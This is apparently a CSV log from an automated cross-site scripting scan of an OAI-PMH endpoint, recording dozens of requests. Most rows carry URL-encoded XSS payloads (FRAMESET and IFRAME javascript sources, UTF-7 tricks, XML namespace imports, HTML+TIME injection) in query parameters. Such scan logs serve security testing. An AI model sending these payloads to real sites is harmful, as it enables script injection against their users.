uuid,timestamp,http_status_code,request_url,response_time,http_version
322aa7db-9c04-4650-9cb4-a12ba6e02393,2025-01-28 14:44:37,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fframeset%3E&until=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fframeset%3E,57.97 ms,HTTP/1.1
20950ae0-6b5a-4f7d-8f78-854d3fcfb57b,2025-01-28 14:44:38,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fframeset%3E,65.84 ms,HTTP/1.1
2c211382-2a61-48fa-b4bb-6636e8d22b80,2025-01-28 14:44:38,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fframeset%3E&metadataPrefix=oai_dc,80.00 ms,HTTP/1.1
0409098f-1ba7-4cc1-9191-fb260ae6a3e2,2025-01-28 14:44:38,200,http://islandora.io/oai/request?verb=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E,52.09 ms,HTTP/1.1
20a659c4-1a17-47ce-9227-1d3311fa453b,2025-01-28 14:44:39,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E,57.94 ms,HTTP/1.1
60e621e0-0f1b-4c40-9c50-32ad573784eb,2025-01-28 14:44:39,200,http://islandora.io/oai/request?verb=ListSets,32.18 ms,HTTP/1.1
61ca3ea1-4afb-4995-917a-b804f334ada1,2025-01-28 14:44:39,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E&set=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E,44.15 ms,HTTP/1.1
7c252c7a-feaa-4b68-bd36-d1dfd61bf2ef,2025-01-28 14:44:40,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E&set=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E,51.02 ms,HTTP/1.1
ca5aa747-51ee-44f6-b87e-dc2acc7e9a43,2025-01-28 14:44:40,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FFRAMESET%3E&metadataPrefix=marc,68.14 ms,HTTP/1.1
9e02f492-2521-4e9b-bca0-1e08a8d62033,2025-01-28 14:44:40,200,http://islandora.io/oai/request?verb=%3CFRAMESET%3E%3CFRAME+SRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E%3C%2FFRAMESET%3E,55.73 ms,HTTP/1.1
fc4934b8-2a12-4ec5-a4a8-79e71c22edc6,2025-01-28 14:44:41,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E%3C%2FFRAMESET%3E,69.70 ms,HTTP/1.1
cd46852e-dfc7-4012-ab4d-aed66a604dbf,2025-01-28 14:44:41,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3CFRAMESET%3E%3CFRAME+SRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E%3C%2FFRAMESET%3E,44.44 ms,HTTP/1.1
04e05ea2-1947-4d52-9115-d5729dc8747d,2025-01-28 14:44:42,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,74.50 ms,HTTP/1.1
d60eb26f-4fc0-4bd2-a332-e1c2b4193575,2025-01-28 14:44:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CFRAMESET%3E%3CFRAME+SRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E%3C%2FFRAMESET%3E,63.67 ms,HTTP/1.1
2b15a754-9ef8-4f14-8c8f-7dc5a66c8ea7,2025-01-28 14:44:42,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CFRAMESET%3E%3CFRAME+SRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E%3C%2FFRAMESET%3E&metadataPrefix=marc,47.40 ms,HTTP/1.1
b546f187-4cf1-4ebd-9b9e-b0cedf55a1ad,2025-01-28 14:44:43,200,http://islandora.io/oai/request?verb=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-%2FSCRIPT%2BAD4-,72.14 ms,HTTP/1.1
885a35e3-be22-48c3-98f2-f67a85b6d655,2025-01-28 14:44:43,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.81 ms,HTTP/1.1
c7d3a77e-34bd-4ea1-83ba-e7b3c5431f7a,2025-01-28 14:44:43,200,http://islandora.io/oai/request?verb=ListSets,56.74 ms,HTTP/1.1
7b80c394-bcc7-4da5-8c69-45e540e6988c,2025-01-28 14:44:44,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-%2FSCRIPT%2BAD4-&until=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-%2FSCRIPT%2BAD4-&set=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-%2FSCRIPT%2BAD4-,47.51 ms,HTTP/1.1
3024eaa2-3413-4ee1-8703-652373687624,2025-01-28 14:44:44,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,115.11 ms,HTTP/1.1
c00f84b6-b9ed-4534-8a73-6ffd2d990729,2025-01-28 14:44:45,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-%2FSCRIPT%2BAD4-&metadataPrefix=oai_dc,55.60 ms,HTTP/1.1
3d75f430-7c16-439e-9aed-81d03dac74b0,2025-01-28 14:44:45,200,http://islandora.io/oai/request?verb=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,54.81 ms,HTTP/1.1
bd6bede2-30f5-47ba-a2a5-9d03d6459742,2025-01-28 14:44:45,200,http://islandora.io/oai/request?verb=ListMetadataFormats,61.25 ms,HTTP/1.1
bec17939-e09e-4d55-8a95-92a24a1f11d9,2025-01-28 14:44:46,200,http://islandora.io/oai/request?verb=ListSets,36.06 ms,HTTP/1.1
612d3dd7-7869-4a99-8fc2-6505182b4c5c,2025-01-28 14:44:46,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&until=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,61.84 ms,HTTP/1.1
1b6ff87f-8585-418e-b39d-4f96206b5637,2025-01-28 14:44:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&set=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-,71.94 ms,HTTP/1.1
fd463686-950b-4ff1-a847-eddfda579b78,2025-01-28 14:44:47,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4-&metadataPrefix=oai_dc,71.62 ms,HTTP/1.1
93eff9ea-7bf0-4c2c-af6d-c03a2657e90e,2025-01-28 14:44:47,200,http://islandora.io/oai/request?verb=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,66.69 ms,HTTP/1.1
e609a7ee-25f1-4f19-94db-fe1b7affdc86,2025-01-28 14:44:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.61 ms,HTTP/1.1
64daeae6-5772-46aa-81e9-adb5ac2d33e5,2025-01-28 14:44:48,200,http://islandora.io/oai/request?verb=ListSets,44.08 ms,HTTP/1.1
6bfd2c3d-9c1e-45b1-9df1-321e6509eeb6,2025-01-28 14:44:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&set=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,56.72 ms,HTTP/1.1
7651b7b1-b97e-4ef1-a296-bb697daa1d25,2025-01-28 14:44:49,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E,72.23 ms,HTTP/1.1
c609d124-697a-41c3-9711-0ed78e174290,2025-01-28 14:44:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22%25%28htc%29s%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E%22%22%22%2C%22XML+namespace.%22%29%2C%28%22%22%22%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%26lt%3BIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Ajavascript%3Aalert%281%29%22%26gt%3B%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E&metadataPrefix=oai_dc,57.23 ms,HTTP/1.1
c71a0b2d-ae31-492b-aae8-b62782069464,2025-01-28 14:44:49,200,http://islandora.io/oai/request?verb=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,56.46 ms,HTTP/1.1
bbb734fa-54d8-49b0-afad-e1bc7d5203e6,2025-01-28 14:44:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.95 ms,HTTP/1.1
9a642e04-74cd-4e28-9ae5-c412e691f160,2025-01-28 14:44:50,200,http://islandora.io/oai/request?verb=ListSets,52.90 ms,HTTP/1.1
845ae91f-f203-4c04-bec6-e4e01d8595de,2025-01-28 14:44:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,55.83 ms,HTTP/1.1
44cbbd7d-1c23-411e-892c-6aac779c9a6b,2025-01-28 14:44:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E&set=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E,58.52 ms,HTTP/1.1
09575a90-6a4e-4bda-984e-c9c42b6e15cc,2025-01-28 14:44:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CHTML+xmlns%3Axss%3E%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fwww.securitycompass.com%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2Fhtml%3E&metadataPrefix=marc,67.44 ms,HTTP/1.1
7b6cb6de-62d2-44c0-873a-c1a2da4e645a,2025-01-28 14:44:51,200,http://islandora.io/oai/request?verb=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,58.11 ms,HTTP/1.1
9131589b-36e3-4665-b57a-5808714023cd,2025-01-28 14:44:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,63.57 ms,HTTP/1.1
504daacf-b585-4c0f-9758-4b5168ebd350,2025-01-28 14:44:52,200,http://islandora.io/oai/request?verb=ListSets,53.06 ms,HTTP/1.1
075e9c6c-8210-42cb-a2fd-cdf96c0326a0,2025-01-28 14:44:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&set=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,71.16 ms,HTTP/1.1
36110c91-273e-49a8-a92d-9077fe4138a4,2025-01-28 14:44:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&set=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,64.57 ms,HTTP/1.1
7fb9f208-314a-4bc3-b166-78dc62d4e3db,2025-01-28 14:44:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&metadataPrefix=oai_dc,48.58 ms,HTTP/1.1
54fec788-9afd-4304-923e-dac0599d23bc,2025-01-28 14:44:54,200,http://islandora.io/oai/request?verb=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,57.87 ms,HTTP/1.1
68b06a69-9cbc-45ec-83e1-1af042d9b820,2025-01-28 14:44:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats,56.22 ms,HTTP/1.1
d40f3b26-7cb9-4c54-bf94-2ca71985078b,2025-01-28 14:44:54,200,http://islandora.io/oai/request?verb=ListSets,40.52 ms,HTTP/1.1
e45ab576-e28c-40f9-9a0d-835bf383220f,2025-01-28 14:44:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,49.90 ms,HTTP/1.1
2daf8b19-2216-4429-924a-861886381986,2025-01-28 14:44:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&set=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,56.32 ms,HTTP/1.1
34aecc6a-8a1b-4aa1-ab13-f677f591756d,2025-01-28 14:44:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E&metadataPrefix=marc,33.88 ms,HTTP/1.1
82d24187-4c6d-4aed-b50c-76ab82233129,2025-01-28 14:44:56,200,http://islandora.io/oai/request?verb=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,72.97 ms,HTTP/1.1
3bf3f0d7-7442-45c3-bcd8-b4d3fb5fd44e,2025-01-28 14:44:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.71 ms,HTTP/1.1
77dfbc60-7332-4545-ae94-aaaff7757b6e,2025-01-28 14:44:56,200,http://islandora.io/oai/request?verb=ListSets,46.84 ms,HTTP/1.1
d5ef217b-3b7e-412e-8b58-0a2662f8ad0e,2025-01-28 14:44:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&set=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,73.36 ms,HTTP/1.1
6e80879c-dc4b-4359-b70e-2b9b446d1f05,2025-01-28 14:44:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,53.49 ms,HTTP/1.1
a684c167-b9a1-435b-88ef-d9f3410ea7dc,2025-01-28 14:44:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&metadataPrefix=oai_dc,46.34 ms,HTTP/1.1
198528c8-03e2-4c2b-bf8e-9be79e0bc45d,2025-01-28 14:44:58,200,http://islandora.io/oai/request?verb=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E,76.50 ms,HTTP/1.1
4f0810dd-502e-4cd4-91c3-ea500b7167fe,2025-01-28 14:44:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3CIFRAME+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C%2Fiframe%3E,62.49 ms,HTTP/1.1
